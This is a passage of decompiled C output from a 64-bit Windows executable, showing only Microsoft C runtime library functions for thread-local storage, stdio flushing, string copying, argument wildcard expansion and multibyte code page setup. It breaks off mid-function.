// ===== __vcrt_FlsFree_0 @ 0x14000920c size=0x55 =====
LPVOID __fastcall _vcrt_FlsFree_0(DWORD dwTlsIndex)
{
  FARPROC function; // rax

  function = try_get_function(5u, "FlsGetValue", (unsigned int *)&unk_140012FD8, (unsigned int *)"FlsGetValue");
  if ( function != nullptr )
    return (LPVOID)((__int64 (__fastcall *)(_QWORD))function)(dwTlsIndex);
  else
    return TlsGetValue(dwTlsIndex);
}


// ===== __acrt_FlsSetValue @ 0x140009264 size=0x68 =====
int __fastcall _acrt_FlsSetValue(DWORD dwTlsIndex, LPVOID lpTlsValue)
{
  FARPROC function; // rax

  function = try_get_function(6u, "FlsSetValue", (unsigned int *)&unk_140012FF0, (unsigned int *)"FlsSetValue");
  if ( function != nullptr )
    return ((__int64 (__fastcall *)(_QWORD, LPVOID))function)(dwTlsIndex, lpTlsValue);
  else
    return TlsSetValue(dwTlsIndex, lpTlsValue);
}


// ===== __acrt_InitializeCriticalSectionEx @ 0x1400092cc size=0x78 =====
int __fastcall _acrt_InitializeCriticalSectionEx(
        LPCRITICAL_SECTION lpCriticalSection,
        DWORD dwSpinCount,
        unsigned int a3)
{
  FARPROC function; // rax

  function = try_get_function(
               0x14u,
               "InitializeCriticalSectionEx",
               (unsigned int *)"\b",
               (unsigned int *)"InitializeCriticalSectionEx");
  if ( function != nullptr )
    return ((__int64 (__fastcall *)(LPCRITICAL_SECTION, _QWORD, _QWORD))function)(lpCriticalSection, dwSpinCount, a3);
  else
    return InitializeCriticalSectionAndSpinCount(lpCriticalSection, dwSpinCount);
}


// ===== __acrt_LCMapStringEx @ 0x140009344 size=0xef =====
int __fastcall _acrt_LCMapStringEx(
        __int64 a1,
        DWORD a2,
        const WCHAR *a3,
        unsigned int a4,
        WCHAR *lpDestStr,
        int cchDest,
        __int64 a7,
        __int64 a8,
        __int64 a9)
{
  FARPROC function; // rbx
  LCID v15; // eax

  function = try_get_function(0x16u, "LCMapStringEx", (unsigned int *)&unk_140013050, (unsigned int *)"LCMapStringEx");
  if ( function != nullptr )
    return ((__int64 (__fastcall *)(__int64, _QWORD, const WCHAR *, _QWORD, WCHAR *, int, __int64, __int64, __int64))function)(
             a1,
             a2,
             a3,
             a4,
             lpDestStr,
             cchDest,
             a7,
             a8,
             a9);
  v15 = _acrt_LocaleNameToLCID(a1, 0);
  return LCMapStringW(v15, a2, a3, a4, lpDestStr, cchDest);
}


// ===== __acrt_LocaleNameToLCID @ 0x140009434 size=0x65 =====
__int64 __fastcall _acrt_LocaleNameToLCID(__int64 a1, unsigned int a2)
{
  FARPROC function; // rax

  function = try_get_function(
               0x18u,
               "LocaleNameToLCID",
               (unsigned int *)&unk_140013068,
               (unsigned int *)"LocaleNameToLCID");
  if ( function != nullptr )
    return ((__int64 (__fastcall *)(__int64, _QWORD))function)(a1, a2);
  else
    return _crtDownlevelLocaleNameToLCID(a1);
}


// ===== __acrt_initialize_winapi_thunks @ 0x14000949c size=0x37 =====
char _acrt_initialize_winapi_thunks()
{
  memset64(qword_14001D800, _security_cookie ^ __ROR8__(0, 64 - ((unsigned __int8)_security_cookie & 0x3Fu)), 0x20u);
  return 1;
}


// ===== __acrt_is_packaged_app @ 0x1400094d4 size=0x85 =====
bool _acrt_is_packaged_app()
{
  FARPROC function; // rax
  int v2; // [rsp+30h] [rbp+8h] BYREF

  if ( dword_14001D900 != 0 )
    return dword_14001D900 == 1;
  function = try_get_function(
               8u,
               "GetCurrentPackageId",
               (unsigned int *)&unk_140013008,
               (unsigned int *)"GetCurrentPackageId");
  if ( function != nullptr && (v2 = 0, ((unsigned int (__fastcall *)(int *, _QWORD))function)(&v2, 0) == 122) )
  {
    _InterlockedExchange(&dword_14001D900, 1);
    return true;
  }
  else
  {
    _InterlockedExchange(&dword_14001D900, 2);
    return false;
  }
}


// ===== __acrt_uninitialize_winapi_thunks @ 0x14000955c size=0x41 =====
char __fastcall _acrt_uninitialize_winapi_thunks(char a1)
{
  __int64 *v1; // rbx
  HMODULE v2; // rcx

  if ( a1 == 0 )
  {
    v1 = qword_14001D760;
    do
    {
      v2 = (HMODULE)*v1;
      if ( *v1 != 0 )
      {
        if ( v2 != (HMODULE)-1LL )
          FreeLibrary(v2);
        *v1 = 0;
      }
      ++v1;
    }
    while ( v1 != qword_14001D800 );
  }
  return 1;
}


// ===== _fcloseall @ 0x1400095a0 size=0xb2 =====
int __cdecl fcloseall()
{
  int i; // ebx
  __int64 v1; // rax
  int v3; // [rsp+20h] [rbp-18h]

  v3 = 0;
  sub_14000AB5C(8);
  for ( i = 3; i != dword_14001D080; ++i )
  {
    v1 = *((_QWORD *)Block + i);
    if ( v1 != 0 )
    {
      if ( (*(_DWORD *)(v1 + 20) & 0x2000) != 0 && fclose(*((FILE **)Block + i)) != -1 )
        ++v3;
      DeleteCriticalSection((LPCRITICAL_SECTION)(*((_QWORD *)Block + i) + 48LL));
      free_base(*((void **)Block + i));
      *((_QWORD *)Block + i) = 0;
    }
  }
  sub_14000ABB0(8);
  return v3;
}


// ===== __acrt_stdio_flush_nolock @ 0x140009654 size=0x77 =====
__int64 __fastcall _acrt_stdio_flush_nolock(__int64 a1)
{
  signed int v2; // edi
  const void *v3; // rsi
  int v4; // eax

  if ( (*(_DWORD *)(a1 + 20) & 3) == 2 && (*(_DWORD *)(a1 + 20) & 0xC0) != 0 )
  {
    v2 = *(_DWORD *)a1 - *(_DWORD *)(a1 + 8);
    *(_DWORD *)(a1 + 16) = 0;
    v3 = *(const void **)(a1 + 8);
    *(_QWORD *)a1 = v3;
    if ( v2 > 0 )
    {
      v4 = fileno((FILE *)a1);
      if ( v2 != write(v4, v3, v2) )
      {
        _InterlockedOr((volatile signed __int32 *)(a1 + 20), 0x10u);
        return 0xFFFFFFFFLL;
      }
      if ( (*(_DWORD *)(a1 + 20) & 4) != 0 )
        _InterlockedAnd((volatile signed __int32 *)(a1 + 20), 0xFFFFFFFD);
    }
  }
  return 0;
}


// ===== _fflush_nolock @ 0x1400096cc size=0x4b =====
int __cdecl fflush_nolock(FILE *Stream)
{
  int v3; // eax

  if ( Stream == nullptr )
    return common_flush_all();
  if ( (unsigned int)_acrt_stdio_flush_nolock((__int64)Stream) != 0 )
    return -1;
  if ( (HIDWORD(Stream->_base) & 0x800) != 0 )
  {
    v3 = fileno(Stream);
    if ( commit(v3) != 0 )
      return -1;
  }
  return 0;
}


// ===== _flushall @ 0x140009718 size=0xa =====
int __cdecl flushall()
{
  return common_flush_all(1);
}


// ===== common_flush_all @ 0x140009724 size=0xe4 =====
__int64 __fastcall common_flush_all(int a1)
{
  __int64 *v2; // rdi
  __int64 *v3; // r14
  __int64 v4; // rbx
  int v5; // eax
  int v6; // edx
  __int64 result; // rax
  unsigned int v8; // [rsp+20h] [rbp-38h]
  unsigned int v9; // [rsp+24h] [rbp-34h]

  v9 = 0;
  v8 = 0;
  sub_14000AB5C(8);
  v2 = (__int64 *)Block;
  v3 = (__int64 *)((char *)Block + 8 * dword_14001D080);
  while ( v2 != v3 )
  {
    v4 = *v2;
    if ( *v2 != 0 )
    {
      sub_140005338(v4);
      if ( (*(_DWORD *)(v4 + 20) & 0x2000) != 0 )
      {
        if ( a1 == 1 )
        {
          if ( fflush_nolock((FILE *)v4) != -1 )
            ++v9;
        }
        else if ( a1 == 0 && (*(_DWORD *)(v4 + 20) & 2) != 0 )
        {
          v5 = fflush_nolock((FILE *)v4);
          v6 = v8;
          if ( v5 == -1 )
            v6 = -1;
          v8 = v6;
        }
      }
      sub_140005344(v4);
    }
    ++v2;
  }
  sub_14000ABB0(8);
  result = v8;
  if ( a1 == 1 )
    return v9;
  return result;
}


// ===== __acrt_stdio_free_buffer_nolock @ 0x140009808 size=0x40 =====
__int64 __fastcall _acrt_stdio_free_buffer_nolock(__int64 a1)
{
  __int64 result; // rax

  result = *(_DWORD *)(a1 + 20) >> 13;
  if ( (*(_DWORD *)(a1 + 20) & 0x2000) != 0 )
  {
    result = *(_DWORD *)(a1 + 20) >> 6;
    if ( (*(_DWORD *)(a1 + 20) & 0x40) != 0 )
    {
      free_base(*(void **)(a1 + 8));
      _InterlockedAnd((volatile signed __int32 *)(a1 + 20), 0xFFFFFEBF);
      *(_QWORD *)(a1 + 8) = 0;
      *(_QWORD *)a1 = 0;
      *(_DWORD *)(a1 + 16) = 0;
      return 0;
    }
  }
  return result;
}


// ===== _towlower_l @ 0x140009848 size=0xc4 =====
wint_t __cdecl towlower_l(wint_t C, _locale_t Locale)
{
  wint_t result; // ax
  __int64 v3; // r10
  wint_t v4; // dx
  int v5; // eax
  __int64 v6; // [rsp+30h] [rbp-20h] BYREF
  __int64 v7; // [rsp+38h] [rbp-18h]
  char v8; // [rsp+48h] [rbp-8h]
  wint_t v9; // [rsp+60h] [rbp+10h] BYREF
  wint_t v10; // [rsp+70h] [rbp+20h]

  v9 = C;
  result = -1;
  if ( C != 0xFFFF )
  {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v6, Locale);
    v3 = *(_QWORD *)(v7 + 312);
    if ( v3 != 0 )
    {
      if ( v9 >= 0x100u )
      {
        v5 = _crtLCMapStringW(v3, 256, &v9);
        v4 = v9;
        if ( v5 != 0 )
          v4 = v10;
      }
      else if ( iswctype(v9, 1u) != 0 )
      {
        v4 = *(unsigned __int8 *)(*(_QWORD *)(v7 + 272) + v9);
      }
      else
      {
        v4 = v9;
      }
    }
    else
    {
      v4 = v9;
      if ( (unsigned __int16)(v9 - 65) <= 0x19u )
        v4 = v9 + 32;
    }
    if ( v8 != 0 )
      *(_DWORD *)(v6 + 936) &= ~2u;
    return v4;
  }
  return result;
}


// ===== wcsncpy_s @ 0x14000990c size=0xe3 =====
errno_t __cdecl wcsncpy_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source, rsize_t MaxCount)
{
  errno_t v4; // r10d
  int *v6; // rax
  errno_t v7; // ebx
  signed __int64 v9; // r8
  wchar_t *v10; // rdx
  rsize_t v11; // rbx
  rsize_t v12; // rdi
  wchar_t v13; // ax
  wchar_t v14; // ax

  v4 = 0;
  if ( MaxCount != 0 )
  {
    if ( Destination == nullptr )
      goto LABEL_4;
  }
  else if ( Destination == nullptr )
  {
    if ( SizeInWords != 0 )
    {
LABEL_4:
      v6 = errno();
      v7 = 22;
LABEL_5:
      *v6 = v7;
      invalid_parameter_noinfo();
      return v7;
    }
    return v4;
  }
  if ( SizeInWords == 0 )
    goto LABEL_4;
  if ( MaxCount == 0 )
  {
    *Destination = 0;
    return v4;
  }
  if ( Source == nullptr )
  {
    *Destination = 0;
    goto LABEL_4;
  }
  v9 = (char *)Source - (char *)Destination;
  v10 = Destination;
  v11 = SizeInWords;
  v12 = MaxCount;
  if ( MaxCount == -1 )
  {
    do
    {
      v13 = *(wchar_t *)((char *)v10 + v9);
      *v10++ = v13;
      if ( v13 == 0 )
        break;
      --v11;
    }
    while ( v11 != 0 );
  }
  else
  {
    do
    {
      v14 = *(wchar_t *)((char *)v10 + v9);
      *v10++ = v14;
      if ( v14 == 0 )
        break;
      if ( --v11 == 0 )
        break;
      --v12;
    }
    while ( v12 != 0 );
    if ( v12 == 0 )
      *v10 = 0;
  }
  if ( v11 == 0 )
  {
    if ( MaxCount == -1 )
    {
      Destination[SizeInWords - 1] = 0;
      return 80;
    }
    *Destination = 0;
    v6 = errno();
    v7 = 34;
    goto LABEL_5;
  }
  return v4;
}


// ===== CompareFunction @ 0x1400099f0 size=0x12 =====
// Microsoft VisualC 64bit universal runtime
__int64 __fastcall CompareFunction(const void *a1, const void *a2)
{
  if ( a1 >= a2 )
    return a1 > a2;
  else
    return 0xFFFFFFFFLL;
}


// ===== ??$common_expand_argv_wildcards@_W@@YAHQEAPEA_WQEAPEAPEA_W@Z @ 0x140009a04 size=0x22f =====
__int64 __fastcall common_expand_argv_wildcards<wchar_t>(const wchar_t **a1, _QWORD *a2)
{
  const wchar_t **v2; // rbx
  bool i; // zf
  const wchar_t *v5; // rcx
  wchar_t *v6; // rax
  wchar_t *v7; // rcx
  unsigned int v8; // eax
  unsigned int v9; // r14d
  void *buffer_for_argv; // rbx
  wchar_t Control[4]; // [rsp+68h] [rbp-18h] BYREF

  v2 = a1;
  if ( a2 != nullptr )
  {
    *a2 = 0;
    for ( i = *a1 == nullptr; !i; i = *v2 == nullptr )
    {
      v5 = *v2;
      wcscpy(Control, L"*?");
      v6 = wcspbrk(v5, Control);
      v7 = (wchar_t *)*v2;
      if ( v6 != nullptr )
        v8 = expand_argument_wildcards<wchar_t>(v7);
      else
        v8 = copy_and_add_argument_to_buffer<wchar_t>(v7, nullptr, 0);
      v9 = v8;
      if ( v8 != 0 )
        goto LABEL_14;
      ++v2;
    }
    *(_QWORD *)Control = 0;
    v9 = -1;
    buffer_for_argv = _acrt_allocate_buffer_for_argv(1u, 0, 2u);
    if ( buffer_for_argv != nullptr )
    {
      v9 = 0;
      *a2 = buffer_for_argv;
    }
    free_base(nullptr);
LABEL_14:
    free_base(nullptr);
    return v9;
  }
  else
  {
    *errno() = 22;
    invalid_parameter_noinfo();
    return 22;
  }
}


// ===== ??$copy_and_add_argument_to_buffer@_W@@YAHQEB_W0_KAEAV?$argument_list@_W@?A0x7b96f60e@@@Z @ 0x140009c34 size=0x112 =====
__int64 __fastcall copy_and_add_argument_to_buffer<wchar_t>(wchar_t *Source, wchar_t *a2, rsize_t MaxCount, __int64 a4)
{
  __int64 v5; // rdi
  rsize_t v9; // rdi
  size_t v11; // r14
  wchar_t *v12; // rax
  wchar_t *v13; // rbx
  unsigned int v14; // edi

  v5 = -1;
  do
    ++v5;
  while ( Source[v5] != 0 );
  v9 = v5 + 1;
  if ( v9 > -1LL - MaxCount )
    return 12;
  v11 = v9 + MaxCount + 1;
  v12 = (wchar_t *)calloc_base(v11, 2u);
  v13 = v12;
  if ( MaxCount != 0 && wcsncpy_s(v12, v11, a2, MaxCount) != 0 )
    invoke_watson(nullptr, nullptr, nullptr, 0, 0);
  if ( wcsncpy_s(&v13[MaxCount], v11 - MaxCount, Source, v9) != 0 )
    invoke_watson(nullptr, nullptr, nullptr, 0, 0);
  v14 = unknown_libname_17(a4);
  if ( v14 != 0 )
  {
    free_base(v13);
  }
  else
  {
    v14 = 0;
    **(_QWORD **)(a4 + 8) = v13;
    *(_QWORD *)(a4 + 8) += 8LL;
  }
  free_base(nullptr);
  return v14;
}


// ===== ??$expand_argument_wildcards@_W@@YAHQEA_W0AEAV?$argument_list@_W@?A0x7b96f60e@@@Z @ 0x140009d48 size=0x1b0 =====
__int64 __fastcall expand_argument_wildcards<wchar_t>(wchar_t *a1, wchar_t *a2, _QWORD *a3)
{
  __int64 v5; // r8
  unsigned __int16 v6; // ax
  unsigned __int16 v8; // cx
  unsigned int v9; // edi
  char v10; // al
  rsize_t v11; // r15
  HANDLE FirstFile; // rbx
  unsigned int v13; // eax
  __int64 v14; // rsi
  __int64 v15; // rdx
  struct _WIN32_FIND_DATAW FindFileData; // [rsp+30h] [rbp-288h] BYREF

  v5 = 0x200000000801LL;
  while ( a2 != a1 )
  {
    v6 = *a2 - 47;
    if ( v6 <= 0x2Du )
    {
      if ( _bittest64(&v5, v6) )
        break;
    }
    --a2;
  }
  if ( *a2 == 58 && a2 != a1 + 1 )
    return copy_and_add_argument_to_buffer<wchar_t>(a1, nullptr, 0, (__int64)a3);
  v8 = *a2 - 47;
  v9 = 0;
  if ( v8 > 0x2Du || (v10 = 1, !_bittest64(&v5, v8)) )
    v10 = 0;
  v11 = (a2 - a1 + 1) & -(__int64)(v10 != 0);
  sub_140002F60((__m128i *)&FindFileData, 0, 0x250u);
  FirstFile = FindFirstFileExW(a1, FindExInfoStandard, &FindFileData, FindExSearchNameMatch, nullptr, 0);
  if ( FirstFile == (HANDLE)-1LL )
  {
    v13 = copy_and_add_argument_to_buffer<wchar_t>(a1, nullptr, 0, (__int64)a3);
  }
  else
  {
    v14 = (__int64)(a3[1] - *a3) >> 3;
    while ( 1 )
    {
      if ( FindFileData.cFileName[0] != 46
        || FindFileData.cFileName[1] != 0 && (FindFileData.cFileName[1] != 46 || FindFileData.cFileName[2] != 0) )
      {
        v13 = copy_and_add_argument_to_buffer<wchar_t>(FindFileData.cFileName, a1, v11, (__int64)a3);
        if ( v13 != 0 )
          break;
      }
      if ( !FindNextFileW(FirstFile, &FindFileData) )
      {
        v15 = (__int64)(a3[1] - *a3) >> 3;
        if ( v14 != v15 )
          qsort((void *)(*a3 + 8 * v14), v15 - v14, 8u, (_CoreCrtNonSecureSearchSortCompareFunction)CompareFunction);
        goto LABEL_15;
      }
    }
  }
  v9 = v13;
LABEL_15:
  if ( FirstFile != (HANDLE)-1LL )
    FindClose(FirstFile);
  return v9;
}


// ===== unknown_libname_17 @ 0x140009ef8 size=0xc7 =====
// Microsoft VisualC 64bit universal runtime
__int64 __fastcall unknown_libname_17(void **a1)
{
  _BYTE *v1; // rsi
  unsigned int v4; // ebx
  char *v5; // rax
  unsigned __int64 v6; // rsi
  char *v7; // rax

  v1 = a1[2];
  if ( a1[1] != v1 )
    return 0;
  v4 = 0;
  if ( *a1 == nullptr )
  {
    *a1 = calloc_base(4u, 8u);
    free_base(nullptr);
    v5 = (char *)*a1;
    if ( *a1 != nullptr )
    {
      a1[1] = v5;
      a1[2] = v5 + 32;
      return 0;
    }
    return 12;
  }
  v6 = (v1 - (_BYTE *)*a1) >> 3;
  if ( v6 > 0x7FFFFFFFFFFFFFFFLL )
    return 12;
  v7 = (char *)j__recalloc_base(*a1, 2 * v6, 8u);
  if ( v7 != nullptr )
  {
    *a1 = v7;
    a1[1] = &v7[8 * v6];
    a1[2] = &v7[16 * v6];
  }
  else
  {
    v4 = 12;
  }
  free_base(nullptr);
  return v4;
}


// ===== j_??$common_expand_argv_wildcards@_W@@YAHQEAPEA_WQEAPEAPEA_W@Z @ 0x140009fc0 size=0x5 =====
// attributes: thunk
__int64 __fastcall common_expand_argv_wildcards<wchar_t>(const wchar_t **a1, _QWORD *a2)
{
  return ??$common_expand_argv_wildcards@_W@@YAHQEAPEA_WQEAPEAPEA_W@Z(a1, a2);
}


// ===== ??$?RV_lambda_99476a1ad63dd22509b5d3e65b0ffc95_@@AEAV_lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c_@@V_lambda_f7424dd8d45958661754dc4f2697e9c3_@@@?$__crt_seh_guarded_call@X@@QEAAX$$QEAV_lambda_99476a1ad63dd22509b5d3e65b0ffc95_@@AEAV_lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c_@@$$QEAV_lambda_f7424dd8d45958661754dc4f2697e9c3_@@@Z @ 0x140009fc8 size=0x38 =====
__int64 __fastcall __crt_seh_guarded_call<void>::operator()<_lambda_99476a1ad63dd22509b5d3e65b0ffc95_,_lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c_ &,_lambda_f7424dd8d45958661754dc4f2697e9c3_>(
        __int64 a1,
        unsigned int *a2,
        __int64 a3,
        unsigned int *a4)
{
  sub_14000AB5C(*a2);
  _lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c_::operator()(a3);
  return sub_14000ABB0(*a4);
}


// ===== ??R_lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c_@@QEBAXXZ @ 0x14000a000 size=0x217 =====
volatile signed __int32 *__fastcall _lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c_::operator()(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rdi
  __m128i *v4; // rcx
  __m128i *v5; // rax
  __int64 i; // rdx
  __m128i v7; // xmm1
  __m128i *v8; // rcx
  __m128i *v9; // rax
  __m128i v10; // xmm1
  volatile signed __int32 *result; // rax

  dword_14001D904 = *(_DWORD *)(*(_QWORD *)(**(_QWORD **)a1 + 136LL) + 4LL);
  dword_14001D908 = *(_DWORD *)(*(_QWORD *)(**(_QWORD **)a1 + 136LL) + 8LL);
  qword_14001D920 = *(_QWORD *)(*(_QWORD *)(**(_QWORD **)a1 + 136LL) + 544LL);
  v2 = *(_QWORD *)(**(_QWORD **)a1 + 136LL) + 12LL;
  if ( *(_QWORD *)(**(_QWORD **)a1 + 136LL) == -12 )
  {
    qword_14001D910 = 0;
    dword_14001D918 = 0;
    *errno() = 22;
    invalid_parameter_noinfo();
  }
  else
  {
    qword_14001D910 = *(_QWORD *)v2;
    dword_14001D918 = *(_DWORD *)(v2 + 8);
  }
  v3 = 2;
  v4 = xmmword_14001C600;
  v5 = (__m128i *)(*(_QWORD *)(**(_QWORD **)a1 + 136LL) + 24LL);
  if ( *(_QWORD *)(**(_QWORD **)a1 + 136LL) == -24 )
  {
    sub_140002F60(xmmword_14001C600, 0, 0x101u);
    *errno() = 22;
    invalid_parameter_noinfo();
  }
  else
  {
    for ( i = 2; i != 0; --i )
    {
      *v4 = *v5;
      v4[1] = v5[1];
      v4[2] = v5[2];
      v4[3] = v5[3];
      v4[4] = v5[4];
      v4[5] = v5[5];
      v4[6] = v5[6];
      v4 += 8;
      v7 = v5[7];
      v5 += 8;
      v4[-1] = v7;
    }
    v4->m128i_i8[0] = v5->m128i_i8[0];
  }
  v8 = xmmword_14001C710;
  v9 = (__m128i *)(*(_QWORD *)(**(_QWORD **)a1 + 136LL) + 281LL);
  if ( *(_QWORD *)(**(_QWORD **)a1 + 136LL) == -281 )
  {
    sub_140002F60(xmmword_14001C710, 0, 0x100u);
    *errno() = 22;
    invalid_parameter_noinfo();
  }
  else
  {
    do
    {
      *v8 = *v9;
      v8[1] = v9[1];
      v8[2] = v9[2];
      v8[3] = v9[3];
      v8[4] = v9[4];
      v8[5] = v9[5];
      v8[6] = v9[6];
      v8 += 8;
      v10 = v9[7];
      v9 += 8;
      v8[-1] = v10;
      --v3;
    }
    while ( v3 != 0 );
  }
  if ( _InterlockedExchangeAdd((volatile signed __int32 *)off_14001C4F8, 0xFFFFFFFF) == 1
    && off_14001C4F8 != &unk_14001C2D0 )
  {
    free_base(off_14001C4F8);
  }
  off_14001C4F8 = *(void **)(**(_QWORD **)a1 + 136LL);
  result = *(volatile signed __int32 **)(**(_QWORD **)a1 + 136LL);
  _InterlockedIncrement(result);
  return result;
}


// ===== ?getSystemCP@@YAHH@Z @ 0x14000a218 size=0x7d =====
__int64 __fastcall getSystemCP(UINT a1)
{
  UINT OEMCP; // eax
  _QWORD v4[3]; // [rsp+20h] [rbp-28h] BYREF
  char v5; // [rsp+38h] [rbp-10h]

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v4, nullptr);
  dword_14001D91C = 0;
  switch ( a1 )
  {
    case 0xFFFFFFFE:
      dword_14001D91C = 1;
      OEMCP = GetOEMCP();
LABEL_5:
      a1 = OEMCP;
      break;
    case 0xFFFFFFFD:
      dword_14001D91C = 1;
      OEMCP = GetACP();
      goto LABEL_5;
    case 0xFFFFFFFC:
      dword_14001D91C = 1;
      a1 = *(_DWORD *)(v4[1] + 12LL);
      break;
    default:
      break;
  }
  if ( v5 != 0 )
    *(_DWORD *)(v4[0] + 936LL) &= ~2u;
  return a1;
}


// ===== ?setSBCS@@YAXPEAU__crt_multibyte_data@@@Z @ 0x14000a298 size=0x90 =====
void __fastcall setSBCS(struct __crt_multibyte_data *a1)
{
  _BYTE *v1; // rbx
  __int64 v3; // rbp
  _WORD *v4; // rdi
  __int64 v5; // rcx
  signed __int64 v6; // rdi
  _BYTE *v7; // rcx
  __int64 i; // rdx

  v1 = (char *)a1 + 24;
  v3 = 257;
  sub_140002F60((__m128i *)((char *)a1 + 24), 0, 0x101u);
  v4 = (_WORD *)((char *)a1 + 12);
  *(_QWORD *)((char *)a1 + 4) = 0;
  v5 = 6;
  *((_QWORD *)a1 + 68) = 0;
  while ( v5 != 0 )
  {
    *v4++ = 0;
    --v5;
  }
  v6 = &unk_14001C2D0 - (_UNKNOWN *)a1;
  do
  {
    *v1 = v1[v6];
    ++v1;
    --v3;
  }
  while ( v3 != 0 );
  v7 = (char *)a1 + 281;
  for ( i = 256; i != 0; --i )
  {
    *v7 = v7[v6];
    ++v7;
  }
}


// ===== ?setSBUpLow@@YAXPEAU__crt_multibyte_data@@@Z @ 0x14000a328 size=0x1e2 =====
void __fastcall setSBUpLow(struct __crt_multibyte_data *a1)
{
  __int64 v2; // rbx
  unsigned int v3; // eax
  CHAR *v4; // rcx
  BYTE v5; // al
  BYTE *LeadByte; // rdx
  unsigned int v7; // r8d
  __int64 i; // rcx
  WORD *v9; // rdx
  char *j; // rcx
  char v11; // al
  unsigned int v12; // edx
  char *v13; // rcx
  char v14; // al
  struct _cpinfo CPInfo; // [rsp+50h] [rbp-B0h] BYREF
  CHAR MultiByteStr[256]; // [rsp+70h] [rbp-90h] BYREF
  char v17[256]; // [rsp+170h] [rbp+70h] BYREF
  char v18[256]; // [rsp+270h] [rbp+170h] BYREF
  WORD CharType[512]; // [rsp+370h] [rbp+270h] BYREF

  v2 = 256;
  if ( GetCPInfo(*((_DWORD *)a1 + 1), &CPInfo) )
  {
    v3 = 0;
    v4 = MultiByteStr;
    do
      *v4++ = v3++;
    while ( v3 < 0x100 );
    v5 = CPInfo.LeadByte[0];
    LeadByte = CPInfo.LeadByte;
    MultiByteStr[0] = 32;
    while ( v5 != 0 )
    {
      v7 = LeadByte[1];
      for ( i = v5; (unsigned int)i <= v7 && (unsigned int)i < 0x100; i = (unsigned int)(i + 1) )
        MultiByteStr[i] = 32;
      LeadByte += 2;
      v5 = *LeadByte;
    }
    _acrt_GetStringTypeA(nullptr, 1u, MultiByteStr, 256, CharType, *((_DWORD *)a1 + 1), 0);
    _acrt_LCMapStringA(nullptr, *((wchar_t **)a1 + 68), 0x100u, MultiByteStr, 256, v17, 256, *((_DWORD *)a1 + 1), 0);
    _acrt_LCMapStringA(nullptr, *((wchar_t **)a1 + 68), 0x200u, MultiByteStr, 256, v18, 256, *((_DWORD *)a1 + 1), 0);
    v9 = CharType;
    for ( j = (char *)a1 + 25; ; ++j )
    {
      if ( (*(_BYTE *)v9 & 1) != 0 )
      {
        *j |= 0x10u;
        v11 = j[v17 - (char *)a1 - 25];
      }
      else
      {
        if ( (*(_BYTE *)v9 & 2) == 0 )
        {
          j[256] = 0;
          goto LABEL_18;
        }
        *j |= 0x20u;
        v11 = j[v18 - (char *)a1 - 25];
      }
      j[256] = v11;
LABEL_18:
      ++v9;
      if ( --v2 == 0 )
        return;
    }
  }
  v12 = 0;
  v13 = (char *)a1 + 25;
  do
  {
    if ( v12 - 97 + 32 <= 0x19 )
    {
      *v13 |= 0x10u;
      v14 = v12 + 32;
LABEL_25:
      v13[256] = v14;
      goto LABEL_27;
    }
    if ( v12 - 97 <= 0x19 )
    {
      *v13 |= 0x20u;
      v14 = v12 - 32;
      goto LABEL_25;
    }
    v13[256] = 0;
LABEL_27:
    ++v12;
    ++v13;
  }
  while ( v12 < 0x100 );
}


// ===== ?setmbcp_internal@@YAHH_N@Z @ 0x14000a50c size=0x1b5 =====
__int64 __fastcall setmbcp_internal(UINT a1, char a2)
{
  unsigned int SystemCP; // edi
  _DWORD *v6; // rax
  _DWORD *v7; // rbx
  __int64 v8; // rdx
  _OWORD *v9; // rcx
  _OWORD *v10; // rax
  __int128 v11; // xmm1
  unsigned int v12; // edi
  void *v13; // rcx
  _DWORD *v14; // rcx
  void *v15; // rax
  unsigned int v16; // [rsp+20h] [rbp-20h] BYREF
  struct __acrt_ptd *v17; // [rsp+28h] [rbp-18h] BYREF
  struct __acrt_ptd **v18; // [rsp+30h] [rbp-10h] BYREF
  char v19; // [rsp+70h] [rbp+30h] BYREF
  unsigned int v20; // [rsp+78h] [rbp+38h] BYREF

  v17 = _acrt_getptd();
  _acrt_update_thread_multibyte_data();
  SystemCP = getSystemCP(a1);
  if ( SystemCP == *(_DWORD *)(*((_QWORD *)v17 + 17) + 4LL) )
    return 0;
  v6 = malloc_base(0x228u);
  v7 = v6;
  if ( v6 != nullptr )
  {
    v8 = 4;
    v9 = v6;
    v10 = *((_OWORD **)v17 + 17);
    do
    {
      *v9 = *v10;
      v9[1] = v10[1];
      v9[2] = v10[2];
      v9[3] = v10[3];
      v9[4] = v10[4];
      v9[5] = v10[5];
      v9[6] = v10[6];
      v9 += 8;
      v11 = v10[7];
      v10 += 8;
      *(v9 - 1) = v11;
      --v8;
    }
    while ( v8 != 0 );
    *v9 = *v10;
    v9[1] = v10[1];
    *((_QWORD *)v9 + 4) = *((_QWORD *)v10 + 4);
    *v7 = 0;
    v12 = setmbcp_nolock(SystemCP, v7, 128);
    if ( v12 != -1 )
    {
      if ( a2 == 0 )
        _acrt_set_locale_changed();
      if ( _InterlockedExchangeAdd(*((volatile signed __int32 **)v17 + 17), 0xFFFFFFFF) == 1 )
      {
        v13 = *((void **)v17 + 17);
        if ( v13 != &unk_14001C2D0 )
          free_base(v13);
      }
      *v7 = 1;
      v14 = v7;
      v7 = nullptr;
      *((_QWORD *)v17 + 17) = v14;
      if ( (*((_BYTE *)v17 + 936) & 2) == 0 && (dword_14001C8C0 & 1) == 0 )
      {
        v18 = &v17;
        v20 = 5;
        v16 = 5;
        __crt_seh_guarded_call<void>::operator()<_lambda_99476a1ad63dd22509b5d3e65b0ffc95_,_lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c_ &,_lambda_f7424dd8d45958661754dc4f2697e9c3_>(
          (__int64)&v19,
          &v16,
          (__int64)&v18,
          &v20);
        v15 = off_14001C2C0;
        if ( a2 != 0 )
          v15 = off_14001C4F8;
        off_14001C2C0 = v15;
      }
      goto LABEL_9;
    }
    *errno() = 22;
  }
  v12 = -1;
LABEL_9:
  free_base(v7);
  return v12;
}


// ===== __acrt_initialize_multibyte @ 0x14000a6c4 size=0x27 =====
char _acrt_initialize_multibyte()
{
  if ( byte_14001D928 == 0 )
  {
    setmbcp_internal(0xFFFFFFFD, 1);
